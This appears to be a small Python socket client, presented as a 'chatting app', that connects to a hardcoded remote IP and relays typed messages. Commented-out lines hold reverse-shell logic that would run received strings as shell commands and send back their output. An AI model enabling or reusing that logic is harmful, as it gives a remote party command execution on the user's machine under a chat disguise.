# -*- coding: utf-8 -*-
"""
Created on Thu Aug 11 01:27:51 2022

@author: jyoti
"""

import socket
import os
import subprocess

s=socket.socket()
#host="192.168.31.222"
host="3.6.122.107"
port=8000
s.connect((host,port))
print("Welcome to the chatting app")
while True:
    data=s.recv(1024)
    print("[R] >> "+data.decode("utf-8"))
    # if data[:2].decode("utf-8"):
    #     os.chdir(data[3:].decode("utf-8"))
    # if len(data)>0:
    #     cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    #     output_byte=cmd.stdout.read() + cmd.stderr.read()
    #     output_str=str(output_byte,"utf-8")
    #     currentWd=os.getcwd()+">"
    output_str=input("\t\t[S] >> ")
    s.send(str.encode(output_str))
    if output_str=="exit":
        break
    #     print(output_str)
        
